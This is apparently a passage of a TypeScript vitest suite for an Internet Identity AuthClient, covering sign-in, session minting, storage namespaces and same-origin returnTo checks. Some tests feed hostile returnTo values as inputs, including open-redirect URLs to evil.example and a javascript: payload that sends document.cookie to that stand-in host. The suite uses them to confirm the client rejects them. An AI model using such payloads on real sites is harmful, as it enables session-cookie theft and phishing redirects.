import type { PublicKey, SignIdentity } from '@icp-sdk/core/agent';
import {
  DelegationChain,
  type DelegationIdentity,
  Ed25519KeyIdentity,
} from '@icp-sdk/core/identity';
import { Principal } from '@icp-sdk/core/principal';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { SessionGoneError } from '../../src/client/app-delegation-source.ts';
import { AuthClient, SessionNotHeldError } from '../../src/client/auth-client.ts';
import { CookieStateStorage } from '../../src/client/cookie-state-storage.ts';
import type { Credential, CredentialStorage } from '../../src/client/credential-storage.ts';
import { IdbCredentialStorage } from '../../src/client/idb-credential-storage.ts';
import { MemoryCredentialStorage } from '../../src/client/memory-credential-storage.ts';
import { InteractionRequiredError } from '../../src/client/session-delegation.ts';
import type { SessionIdentity } from '../../src/client/session-identity.ts';
import { slotsFor } from '../../src/client/slots.ts';
import { MemoryStateStorage } from '../../src/client/state-storage.ts';
import { FakeTransport } from './fake-transport.ts';

/** The bare names, which is what a client with no namespace writes under. */
const SLOTS = slotsFor();

const II_CANISTER = Principal.fromText('rdmx6-jaaaa-aaaaa-aaadq-cai');

// Minting is a canister call, so the source is replaced rather than the network.
// The timing it drives is covered in session-identity.test.ts; what matters here
// is that AuthClient mints at sign-in and stores what came back. The mock fills
// in `minted.accountKey` so assertions can name the principal it roots at.
const minted = vi.hoisted(() => ({
  accountKey: undefined as SignIdentity | undefined,
  createdWith: [] as { canisterId?: unknown; agentOptions?: unknown }[],
  count: 0,
  revoked: 0,
  refuse: false,
}));

vi.mock('../../src/client/session-minter.ts', async () => {
  const { DelegationChain: Chain, Ed25519KeyIdentity: Key } = await import(
    '@icp-sdk/core/identity'
  );
  const accountKey = Key.generate();
  minted.accountKey = accountKey;
  return {
    SessionMinter: {
      create: async (options: { canisterId?: unknown; agentOptions?: unknown }) => ({
        mint: async (appPublicKey: Uint8Array) => {
          minted.createdWith.push({
            canisterId: options.canisterId,
            agentOptions: options.agentOptions,
          });
          minted.count += 1;
          if (minted.refuse) {
            const { SessionGoneError } = await import('../../src/client/app-delegation-source.ts');
            throw new SessionGoneError();
          }
          return Chain.create(
            accountKey,
            { toDer: () => appPublicKey } as unknown as PublicKey,
            new Date(Date.now() + 5 * 60 * 1000),
          );
        },
        revoke: async () => {
          minted.revoked += 1;
        },
      }),
    },
  };
});

// Swap `PostMessageTransport` for `FakeTransport` so `AuthClient` uses the real
// `Signer` over an in-memory transport — no window is opened and nothing about
// the signer's JSON-RPC correlation is faked. `UrlTransport` is kept as the
// real export so the constructor's `instanceof UrlTransport` transport-select
// check behaves; redirect-flow tests replace it separately.
vi.mock('@icp-sdk/signer/web', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@icp-sdk/signer/web')>();
  const { FakeTransport } = await import('./fake-transport.ts');
  return { ...actual, PostMessageTransport: FakeTransport };
});

function toBase64(bytes: Uint8Array): string {
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary);
}

function fromBase64(value: string): Uint8Array {
  const binary = atob(value);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return bytes;
}

// A credential store backed by memory, with every call recorded, so a test can
// assert what was written without reaching into an implementation's internals.
function spyStorage(seed?: Credential): CredentialStorage & {
  writes: { slot: string; credential: Credential }[];
} {
  const inner = new MemoryCredentialStorage();
  const writes: { slot: string; credential: Credential }[] = [];
  const storage = {
    shared: inner.shared,
    durable: inner.durable,
    writes,
    create: () => inner.create(),
    get: (slot: string) => inner.get(slot),
    set: vi.fn(async (slot: string, credential: Credential) => {
      writes.push({ slot, credential });
      await inner.set(slot, credential as never);
    }),
    remove: vi.fn((slot: string) => inner.remove(slot)),
  };
  if (seed) void inner.set(SLOTS.session, seed as never);
  return storage;
}

// The state a stored chain puts an origin in, so a test that seeds storage
// directly seeds what AuthClient reads to decide it is signed in.
function stateFor(chain: DelegationChain): MemoryStateStorage {
  const storage = new MemoryStateStorage();
  storage.set({
    // The account the mint reports, not the session chain's own root: the state
    // names who an application's canisters see.
    principal: Principal.selfAuthenticating(
      new Uint8Array(minted.accountKey?.getPublicKey().toDer() ?? []),
    ),
    expiration: chain.delegations[0]!.delegation.expiration,
  });
  return storage;
}

async function createTestDelegation(key: Ed25519KeyIdentity, expiration?: Date) {
  const exp = expiration ?? new Date(Date.now() + 24 * 60 * 60 * 1000); // 1 day from now
  return DelegationChain.create(key, key.getPublicKey(), exp);
}

function encodeDelegationChainResponse(chain: DelegationChain) {
  return {
    publicKey: toBase64(new Uint8Array(chain.publicKey)),
    signerDelegation: chain.delegations.map((sd) => ({
      delegation: {
        pubkey: toBase64(new Uint8Array(sd.delegation.pubkey)),
        expiration: sd.delegation.expiration.toString(),
        targets: sd.delegation.targets?.map((t) => t.toText()),
      },
      signature: toBase64(new Uint8Array(sd.signature)),
    })),
  };
}

type JsonRpcBody =
  | { result: unknown }
  | { error: { code: number; message: string; data?: unknown } };

const DEFAULT_REQUEST_ATTRIBUTES_BODY: JsonRpcBody = {
  result: { data: btoa('hello'), signature: btoa('sig') },
};

// A session-chain response as Internet Identity builds it: a chain to the
// requested session key, restricted to the Internet Identity canister, and
// lasting as long as the session the user consented to.
async function conformantSignInBody(params: {
  sessionPublicKey: string;
  maxTimeToLive?: string;
  maxTimeToIdle?: string;
}): Promise<JsonRpcBody> {
  const to = { toDer: () => fromBase64(params.sessionPublicKey) } as unknown as PublicKey;
  const ttlMs =
    params.maxTimeToLive !== undefined
      ? Number(BigInt(params.maxTimeToLive) / 1_000_000n)
      : 60 * 60 * 1000;
  const chain = await DelegationChain.create(
    Ed25519KeyIdentity.generate(),
    to,
    new Date(Date.now() + ttlMs),
    { targets: [II_CANISTER] },
  );
  return { result: encodeDelegationChainResponse(chain) };
}

/**
 * Registers an `ii_session_delegation` handler. By default it returns a session
 * chain to the requested key; pass `body` to force a specific response.
 */
function handleSignIn(transport: FakeTransport, body?: JsonRpcBody): void {
  transport.onRequest(async (req) => {
    if (req.method !== 'ii_session_delegation') return;
    if (req.id === undefined || req.id === null) return;
    const resolved = body ?? (await conformantSignInBody(req.params as never));
    return { jsonrpc: '2.0', id: req.id, ...resolved };
  });
}

/**
 * Registers an `ii-icrc3-attributes` handler that returns the given body.
 * Defaults to a valid success response with placeholder data and signature.
 */
function handleRequestAttributes(
  transport: FakeTransport,
  body: JsonRpcBody = DEFAULT_REQUEST_ATTRIBUTES_BODY,
): void {
  transport.onRequest((req) => {
    if (req.method !== 'ii-icrc3-attributes') return;
    if (req.id === undefined || req.id === null) return;
    return { jsonrpc: '2.0', id: req.id, ...body };
  });
}

beforeEach(() => {
  vi.unstubAllGlobals();
  vi.useRealTimers();
  localStorage.clear();
  FakeTransport.reset();
});

afterEach(async () => {
  await new Promise((r) => setTimeout(r, 0));
  localStorage.clear();
});

describe('AuthClient', () => {
  it('should initialize with an AnonymousIdentity', async () => {
    const client = new AuthClient();
    expect(client.isAuthenticated()).toBe(false);
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
  });

  it('should use a provided identity as the key for hydration', async () => {
    const identity = Ed25519KeyIdentity.generate();
    const chain = await createTestDelegation(identity);
    const client = new AuthClient({
      identity,
      credentialStorage: spyStorage({ identity, chain }),
      stateStorage: stateFor(chain),
    });
    const resolved = await client.getIdentity();
    expect(resolved.getPrincipal().isAnonymous()).toBe(false);
  });

  it('stops claiming a sign-in it has nothing left to restore', async () => {
    // A record naming a sign-in with nothing behind it: a credential store
    // cleared on its own, or one that does not survive a reload paired with a
    // state that does.
    const stateStorage = new MemoryStateStorage();
    stateStorage.set({
      principal: Principal.selfAuthenticating(new Uint8Array([1, 2, 3])),
      expiration: (BigInt(Date.now()) + 3_600_000n) * 1_000_000n,
    });
    const client = new AuthClient({ credentialStorage: spyStorage(), stateStorage });
    await client.getIdentity();

    // Saying "signed in" with nothing to act with is what the state leading forbids.
    expect(stateStorage.get()).toBeNull();
    expect(client.isAuthenticated()).toBe(false);
  });

  it.each([
    ['signed-out', null, false],
    ['signed-in', { held: true, ms: 3_600_000 }, true],
    ['signed-in-elsewhere', { held: false, ms: 3_600_000 }, false],
    ['expired', { held: true, ms: -1000 }, false],
  ] as const)('reports %s', (expected, shape, authenticated) => {
    const principal = Principal.selfAuthenticating(new Uint8Array([1, 2, 3]));
    const stateStorage = {
      get: () =>
        shape === null
          ? null
          : {
              principal,
              expiration: (BigInt(Date.now()) + BigInt(shape.ms)) * 1_000_000n,
              held: shape.held,
            },
      set: vi.fn(),
      remove: vi.fn(),
      discard: vi.fn(),
    };

    const client = new AuthClient({ stateStorage });

    expect(client.getStatus().status).toBe(expected);
    // The predicate is the same rule, so the two can never disagree.
    expect(client.isAuthenticated()).toBe(authenticated);
  });

  it('carries the account in every case where a record exists', () => {
    const principal = Principal.selfAuthenticating(new Uint8Array([1, 2, 3]));
    const stateStorage = {
      get: () => ({
        principal,
        expiration: (BigInt(Date.now()) - 1_000n) * 1_000_000n,
        held: false,
      }),
      set: vi.fn(),
      remove: vi.fn(),
      discard: vi.fn(),
    };

    const status = new AuthClient({ stateStorage }).getStatus();

    // A silent re-issue needs it to name the account, so the type carries it
    // wherever there is one to carry.
    expect(status.status === 'signed-out' ? null : status.principal).toEqual(principal);
  });

  it('is not authenticated by a record this origin does not hold', async () => {
    // What a store whose record reaches further than one origin reports on an
    // origin that has not acquired a credential of its own.
    const stateStorage = {
      get: () => ({
        principal: Principal.selfAuthenticating(new Uint8Array([1, 2, 3])),
        expiration: (BigInt(Date.now()) + 3_600_000n) * 1_000_000n,
        held: false,
      }),
      set: vi.fn(),
      remove: vi.fn(),
      discard: vi.fn(),
    };

    const client = new AuthClient({ stateStorage });

    // Someone is signed in within that store's reach; this origin cannot act.
    expect(stateStorage.get()).not.toBeNull();
    expect(client.isAuthenticated()).toBe(false);
  });

  it('keeps two clients under one origin apart when they are namespaced', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const first = new AuthClient({ credentialStorage, namespace: 'one' });
    handleSignIn(FakeTransport.last());
    await first.signIn();

    // Same store, different namespace: the second client writes elsewhere and
    // finds nothing of the first's.
    const second = new AuthClient({ credentialStorage, namespace: 'two' });
    const identity = await second.getIdentity();

    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    expect(await credentialStorage.get('one:session')).not.toBeNull();
    expect(await credentialStorage.get('two:session')).toBeNull();
    // The record of who is signed in moves with the slots. Leaving it fixed gave
    // two namespaced clients their own credentials and one shared answer to who
    // was signed in, which is the half a namespace exists to prevent.
    expect(localStorage.getItem('one:ic-session-state')).not.toBeNull();
    expect(localStorage.getItem('ic-session-state')).toBeNull();
  });

  it('keeps a namespaced sign-in wholly inside its namespace', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const client = new AuthClient({
      credentialStorage,
      namespace: 'one',
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    // Every name the sign-in touches carries the prefix. A bare one left behind
    // is a credential the client never reads and never clears: the identity
    // would mint again on the next load, and sign-out would miss it.
    expect(await credentialStorage.get('one:session')).not.toBeNull();
    expect(await credentialStorage.get('one:app')).not.toBeNull();
    expect(await credentialStorage.get(SLOTS.session)).toBeNull();
    expect(await credentialStorage.get(SLOTS.app)).toBeNull();

    await client.signOut();

    expect(await credentialStorage.get('one:session')).toBeNull();
    expect(await credentialStorage.get('one:app')).toBeNull();
  });

  it('reports a denied silent request as one needing a ceremony', async () => {
    const client = new AuthClient({
      credentialStorage: new MemoryCredentialStorage(),
      prompt: 'none',
    });
    FakeTransport.last().onRequest((request) => ({
      jsonrpc: '2.0',
      id: request.id ?? null,
      error: { code: 3002, message: 'interaction required', data: { reason: 'login_required' } },
    }));

    // A denial, not a failure: 3002 is in ICRC-25's user-action range, which is
    // the whole point of the code — a caller that cannot tell this apart from a
    // transport error has no way to decide between signing in and retrying.
    const error = await client.signIn().catch((thrown: unknown) => thrown);
    expect(error).toBeInstanceOf(InteractionRequiredError);
    expect((error as InteractionRequiredError).reason).toBe('login_required');
  });

  it('leaves any other denial an ordinary error', async () => {
    const client = new AuthClient({
      credentialStorage: new MemoryCredentialStorage(),
    });
    FakeTransport.last().onRequest((request) => ({
      jsonrpc: '2.0',
      id: request.id ?? null,
      error: { code: 4000, message: 'user cancelled' },
    }));

    // Everything else stays what it was. Reading `interaction_required` into a
    // cancelled ceremony would have an app skip the sign-in the user asked to
    // abandon.
    const error = await client.signIn().catch((thrown: unknown) => thrown);
    expect(error).not.toBeInstanceOf(InteractionRequiredError);
    expect((error as Error).message).toBe('user cancelled');
  });

  it('refuses the identity provider as a bare URL, which it used to be', () => {
    // Silently ignored would mean both halves falling back to mainnet.
    expect(() => new AuthClient({ identityProvider: 'https://id.ai/authorize' as never })).toThrow(
      TypeError,
    );
    expect(
      () => new AuthClient({ identityProvider: new URL('https://id.ai/authorize') as never }),
    ).toThrow(TypeError);
  });

  it('should sign users out', async () => {
    const client = new AuthClient();
    await client.signOut();
    expect(client.isAuthenticated()).toBe(false);
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
  });

  it('navigates to a same-origin returnTo once the sign-in is stored', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const stateStorage = new MemoryStateStorage();

    // Captured at the moment of navigation rather than after it. This leaves the
    // page, so what matters is that the sign-in was already stored when it did —
    // asserting on the state afterwards would pass whatever the order was.
    // Every call, not the last one: a flow that navigated early and again at the
    // end would leave a final `true` behind and look correct.
    const storedAtEachNavigation: boolean[] = [];
    const replace = vi.fn(() => {
      storedAtEachNavigation.push(stateStorage.get() !== null);
    });
    vi.stubGlobal('location', {
      replace,
      reload: vi.fn(),
      href: 'http://localhost/sign-in',
      origin: 'http://localhost',
    });

    const client = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());

    await client.signIn({ returnTo: '/app' });

    // Replaced, not pushed: the sign-in page and the redirect chain that led
    // through it are not somewhere a back button should return to.
    expect(replace).toHaveBeenCalledWith('http://localhost/app');
    expect(storedAtEachNavigation).toEqual([true]);
    expect(await credentialStorage.get(SLOTS.session)).not.toBeNull();
  });

  it('ignores a cross-origin or javascript: returnTo on sign in', async () => {
    const replace = vi.fn();
    vi.stubGlobal('location', {
      replace,
      reload: vi.fn(),
      href: 'http://localhost/sign-in',
      origin: 'http://localhost',
    });

    for (const returnTo of [
      'https://evil.example/app',
      '//evil.example/app',
      'javascript:alert(1)',
    ]) {
      const client = new AuthClient({
        credentialStorage: new MemoryCredentialStorage(),
      });
      handleSignIn(FakeTransport.last());

      // Ignored rather than refused: a returnTo is a convenience, and failing the
      // sign-in over one would be worse than landing where the caller started.
      await expect(client.signIn({ returnTo })).resolves.toBeDefined();
    }

    expect(replace).not.toHaveBeenCalled();
  });

  it('does not navigate when no returnTo was given', async () => {
    const replace = vi.fn();
    vi.stubGlobal('location', {
      replace,
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient({
      credentialStorage: new MemoryCredentialStorage(),
    });
    handleSignIn(FakeTransport.last());

    await client.signIn();

    expect(replace).not.toHaveBeenCalled();
  });

  it('navigates to a same-origin returnTo on sign out', async () => {
    vi.stubGlobal('location', {
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    const pushState = vi.spyOn(window.history, 'pushState').mockImplementation(() => {});
    await client.signOut({ returnTo: '/logged-out' });
    expect(pushState).toHaveBeenCalledWith({}, '', 'http://localhost/logged-out');
    pushState.mockRestore();
  });

  it('falls back to a location navigation to the validated target when pushState throws', async () => {
    vi.stubGlobal('location', {
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    const pushState = vi.spyOn(window.history, 'pushState').mockImplementation(() => {
      throw new Error('pushState unavailable');
    });
    await client.signOut({ returnTo: '/logged-out' });
    // Fallback navigates to the resolved, validated same-origin URL — never the raw string.
    expect(window.location.href).toBe('http://localhost/logged-out');
    pushState.mockRestore();
  });

  it('refuses a cross-origin, protocol-relative, or javascript: returnTo', async () => {
    // A concrete same-origin location so `//evil.example` resolves (to
    // http://evil.example/) and is rejected on the origin check — not because
    // the base is undefined.
    vi.stubGlobal('location', {
      reload: vi.fn(),
      href: 'http://localhost/app',
      origin: 'http://localhost',
    });
    const client = new AuthClient();
    const pushState = vi.spyOn(window.history, 'pushState');
    for (const returnTo of [
      'https://evil.example/phish',
      '//evil.example',
      'javascript:fetch("https://evil.example/" + document.cookie)',
    ]) {
      await client.signOut({ returnTo });
    }
    // Neither sink is reached: no history entry, and the location.href fallback
    // never navigated away from the current page.
    expect(pushState).not.toHaveBeenCalled();
    expect(window.location.href).toBe('http://localhost/app');
    pushState.mockRestore();
  });

  it.each([
    ['google', 'https://accounts.google.com'],
    ['apple', 'https://appleid.apple.com'],
    ['microsoft', 'https://login.microsoftonline.com/{tid}/v2.0'],
  ] as const)('should pass openid=%s search param to the transport', (provider, expectedUrl) => {
    new AuthClient({ openIdProvider: provider });
    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.get('openid')).toBe(expectedUrl);
  });

  it('should not include openid search param when openIdProvider is not set', () => {
    new AuthClient();
    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.has('openid')).toBe(false);
  });

  it.each(['none', 'login'] as const)(
    'should pass prompt=%s search param to the transport',
    (prompt) => {
      new AuthClient({ prompt });
      const url = new URL(FakeTransport.last().options.url ?? '');
      expect(url.searchParams.get('prompt')).toBe(prompt);
    },
  );

  it('should pass the hint principal as text in the search param', () => {
    new AuthClient({ hint: Principal.fromText('2vxsx-fae') });
    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.get('hint')).toBe('2vxsx-fae');
  });

  it('asks for the sign-in to be kept where the store is one siblings read', () => {
    new AuthClient({ stateStorage: new CookieStateStorage({ domain: 'localhost' }) });

    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.get('resumable')).toBe('true');
  });

  it('asks for nothing to be kept for a store only this origin reads', () => {
    new AuthClient({ stateStorage: new MemoryStateStorage() });

    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.has('resumable')).toBe(false);
  });

  it.each([
    ['on', true, 'true'],
    ['off', false, null],
  ] as const)('lets the option turn it %s over the store', (_name, resumable, expected) => {
    // A cross-origin arrangement that is not sibling subdomains opts in by hand;
    // siblings that should each sign in properly force it off.
    new AuthClient({
      resumable,
      stateStorage: resumable
        ? new MemoryStateStorage()
        : new CookieStateStorage({ domain: 'localhost' }),
    });

    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.get('resumable')).toBe(expected);
  });

  it('should include neither prompt nor hint when they are not set', () => {
    new AuthClient();
    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.has('prompt')).toBe(false);
    expect(url.searchParams.has('hint')).toBe(false);
  });

  it('acquires silently for the account the state names, without a ceremony', async () => {
    // What a sibling subdomain's sign-in leaves for this origin: a shared state
    // naming an account, and no credentials of its own.
    const stateStorage = new MemoryStateStorage();
    const signedIn = new AuthClient({ stateStorage });
    handleSignIn(FakeTransport.last());
    await signedIn.signIn();
    const account = stateStorage.get()?.principal;

    const sibling = new AuthClient({
      stateStorage,
      credentialStorage: new MemoryCredentialStorage(),
      prompt: 'none',
      hint: account,
    });
    handleSignIn(FakeTransport.last());
    const identity = await sibling.signIn();

    const url = new URL(FakeTransport.last().options.url ?? '');
    expect(url.searchParams.get('prompt')).toBe('none');
    expect(url.searchParams.get('hint')).toBe(account?.toText());
    expect(identity.getPrincipal().isAnonymous()).toBe(false);
  });

  it('should forward windowOpenerFeatures to the transport', () => {
    new AuthClient({ windowOpenerFeatures: 'width=500,height=600' });
    expect(FakeTransport.last().options.windowOpenerFeatures).toBe('width=500,height=600');
  });

  it('memoize runs the producer and returns its value in window mode', async () => {
    const client = new AuthClient(); // default 'window' transport
    const produce = vi.fn(async () => 'value');

    expect(await client.memoize(produce)).toBe('value');
    expect(produce).toHaveBeenCalledOnce();
  });
});

describe('AuthClient signIn', () => {
  it('should return the authenticated identity', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last());
    const identity = await client.signIn();
    expect(identity.getPrincipal().toString()).toBeTruthy();
  });

  it('should propagate signer errors from the delegation request', async () => {
    const client = new AuthClient();
    handleSignIn(FakeTransport.last(), {
      error: { code: -1, message: 'connection failed' },
    });
    await expect(client.signIn()).rejects.toThrow('connection failed');
  });

  it('fails the sign-in when the session granted has nothing left to mint against', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const client = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());

    // One millisecond of session: the fixture takes the chain's life from the
    // requested ceiling. Nothing can be minted against it, so an identity built
    // around it could never sign.
    await expect(client.signIn({ maxTimeToLive: 1_000_000n })).rejects.toThrow(SessionGoneError);

    // And nothing is recorded. Reporting a sign-in that cannot make a call would
    // have the application render a signed-in page and fail on its first request,
    // which is the outcome this refusal exists to avoid.
    expect(stateStorage.get()).toBeNull();
    expect(await credentialStorage.get(SLOTS.app)).toBeNull();
  });

  it('asks for a session, carrying maxTimeToLive and no targets', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);

    // An hour, in nanoseconds. The value only has to survive onto the wire, but
    // the fixture derives the session's own life from it — so a token number here
    // would build a session already too short to mint against, which is a
    // different outcome and not the one this test is about.
    await client.signIn({ maxTimeToLive: 3_600_000_000_000n });

    const req = transport.requests[0];
    expect(req.method).toBe('ii_session_delegation');
    expect(req.params?.sessionPublicKey).toEqual(expect.any(String));
    expect(req.params?.maxTimeToLive).toBe('3600000000000');
    // A session chain is restricted to Internet Identity, so an application has
    // no targets to ask for: what it may call is decided by the delegations
    // minted from the session, not by the session itself.
    expect(req.params?.targets).toBeUndefined();
  });

  it('carries maxTimeToIdle where the application asked for one', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);

    await client.signIn({ maxTimeToLive: 3_600_000_000_000n, maxTimeToIdle: 600_000_000_000n });

    expect(transport.requests[0].params?.maxTimeToIdle).toBe('600000000000');
    client.dispose();
  });

  it('omits maxTimeToIdle where it did not, leaving the provider its own default', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);

    await client.signIn({ maxTimeToLive: 3_600_000_000_000n });

    // Absent rather than a number this library picked: the bound belongs to the
    // canister, and sending one here would quietly override its default.
    expect(transport.requests[0].params).not.toHaveProperty('maxTimeToIdle');
    client.dispose();
  });

  it('should forward derivationOrigin on every request as icrc95DerivationOrigin', async () => {
    const client = new AuthClient({ derivationOrigin: 'https://example.com' });
    const transport = FakeTransport.last();
    handleSignIn(transport);

    await client.signIn();

    expect(transport.requests[0].params?.icrc95DerivationOrigin).toBe('https://example.com');
  });

  it('should persist the key and its delegation as one record after sign-in', async () => {
    const storage = spyStorage();
    const client = new AuthClient({ credentialStorage: storage });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    const session = storage.writes.filter((write) => write.slot === SLOTS.session);
    expect(session).toHaveLength(1);
    expect(session[0]?.credential.identity).toBeDefined();
    expect(session[0]?.credential.chain).toBeDefined();
  });

  it('should generate a fresh key for each sign-in', async () => {
    const storage = spyStorage();
    const client = new AuthClient({ credentialStorage: storage });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    await client.signIn();

    const keys = storage.writes
      .filter((write) => write.slot === SLOTS.session)
      .map((write) => write.credential.identity.getPublicKey().toDer().toString());
    expect(keys).toHaveLength(2);
    expect(keys[0]).not.toEqual(keys[1]);
  });

  it('should report the user as authenticated after sign-in', async () => {
    const client = new AuthClient({});
    handleSignIn(FakeTransport.last());
    expect(client.isAuthenticated()).toBe(false);
    await client.signIn();
    expect(client.isAuthenticated()).toBe(true);
  });

  it('should report the user as not authenticated after sign-out', async () => {
    const client = new AuthClient({});
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(client.isAuthenticated()).toBe(true);
    await client.signOut();
    expect(client.isAuthenticated()).toBe(false);
  });

  it('records the account and the expiry in the supplied state storage', async () => {
    const stateStorage = new MemoryStateStorage();
    const client = new AuthClient({ stateStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    const state = stateStorage.get();
    const identity = await client.getIdentity();
    expect(state?.principal.toText()).toBe(identity.getPrincipal().toText());
    expect(state?.expiration).toBeGreaterThan(BigInt(Date.now()) * BigInt(1_000_000));
  });

  it('names who is signed in synchronously, from the state', () => {
    const stateStorage = new MemoryStateStorage();
    const principal = Principal.selfAuthenticating(new Uint8Array([1, 2, 3]));
    stateStorage.set({ principal, expiration: BigInt(Date.now() + 60_000) * 1_000_000n });
    const client = new AuthClient({ stateStorage });

    // No await, no store opened, no mint: this is the answer a page renders on.
    expect(client.getPrincipal()?.toText()).toBe(principal.toText());
  });

  it('names nobody when no record exists', () => {
    const client = new AuthClient({
      stateStorage: new MemoryStateStorage(),
    });
    expect(client.getPrincipal()).toBeUndefined();
  });

  it('names nobody for a session that has expired, and agrees with isAuthenticated', () => {
    const stateStorage = new MemoryStateStorage();
    const principal = Principal.selfAuthenticating(new Uint8Array([4, 5, 6]));
    stateStorage.set({ principal, expiration: BigInt(Date.now() - 60_000) * 1_000_000n });
    const client = new AuthClient({ stateStorage });

    // A principal here means calls made as it will be accepted. `if
    // (getPrincipal())` is the check an application reaches for, so answering for
    // a session that has ended would have it act on one.
    expect(client.getPrincipal()).toBeUndefined();
    expect(client.isAuthenticated()).toBe(false);

    // Nothing is lost: getStatus() carries the account, with the status attached
    // so it cannot be mistaken for permission to act.
    const status = client.getStatus();
    expect(status.status).toBe('expired');
    expect(status.status !== 'signed-out' && status.principal.toText()).toBe(principal.toText());
  });

  it('never disagrees with isAuthenticated', () => {
    const stateStorage = new MemoryStateStorage();
    const client = new AuthClient({ stateStorage });
    const principal = Principal.selfAuthenticating(new Uint8Array([7, 8, 9]));

    for (const expiration of [
      BigInt(Date.now() + 60_000) * 1_000_000n,
      BigInt(Date.now() - 60_000) * 1_000_000n,
    ]) {
      stateStorage.set({ principal, expiration });
      // One predicate, two return types. They are the same question, so an
      // application cannot get a principal it is not allowed to act as.
      expect(client.getPrincipal() !== undefined).toBe(client.isAuthenticated());
    }

    stateStorage.remove();
    expect(client.getPrincipal() !== undefined).toBe(client.isAuthenticated());
  });

  it('answers isAuthenticated from the state storage and not from the delegation', async () => {
    const stateStorage = new MemoryStateStorage();
    const client = new AuthClient({ stateStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(client.isAuthenticated()).toBe(true);

    // The delegation is untouched; only the state is gone.
    stateStorage.remove();

    expect(client.isAuthenticated()).toBe(false);
  });

  it('restores a session and adopts the app credential rather than minting again', async () => {
    const credentialStorage = new IdbCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());
    await first.signIn();
    const after = minted.count;

    const second = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    const identity = await second.getIdentity();

    expect(identity.getPrincipal().isAnonymous()).toBe(false);
    expect(minted.count).toBe(after); // what was stored was enough
  });

  it('mints on a load that finds no app credential, which is where the account comes from', async () => {
    const credentialStorage = new IdbCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());
    await first.signIn();

    // Put the store in the state a spent delegation leaves it in. The removal
    // itself is TAB-5's, covered in session-identity.test.ts; here it is setup
    // for what a load does when it finds no app credential.
    await credentialStorage.remove(SLOTS.app);
    const after = minted.count;

    const second = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    const identity = await second.getIdentity();

    expect(minted.count).toBe(after + 1);
    expect(identity.getPrincipal().isAnonymous()).toBe(false);
  });

  it('drops a session the state no longer names, as a sibling signing in elsewhere leaves it', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());
    await first.signIn();

    // What a sibling subdomain signing in as someone else leaves behind: the
    // shared record names another account, while this origin's credentials do not.
    const other = stateStorage.get();
    stateStorage.set({
      principal: Principal.selfAuthenticating(new Uint8Array([9, 9, 9])),
      expiration: other?.expiration ?? 0n,
    });

    const second = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    const identity = await second.getIdentity();

    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    expect(await credentialStorage.get(SLOTS.session)).toBeNull();
  });

  it('does not restore a session the state does not back, and drops it', async () => {
    const credentialStorage = new IdbCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());
    await first.signIn();
    expect(await credentialStorage.get(SLOTS.session)).not.toBeNull();

    // Only the state goes; the credential is left exactly where it was.
    stateStorage.remove();

    const second = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    const identity = await second.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    expect(await credentialStorage.get(SLOTS.session)).toBeNull();
  });

  it('mints inside the ceremony, so the identity it returns already holds one', async () => {
    const storage = spyStorage();
    const client = new AuthClient({
      credentialStorage: storage,
    });
    handleSignIn(FakeTransport.last());

    const before = minted.count;
    const identity = (await client.signIn()) as DelegationIdentity;

    // A delta: the counter is shared across this file, so an absolute number
    // would pass on mints another test made.
    expect(minted.count).toBe(before + 1);
    expect(identity.getDelegation().delegations).toHaveLength(1);
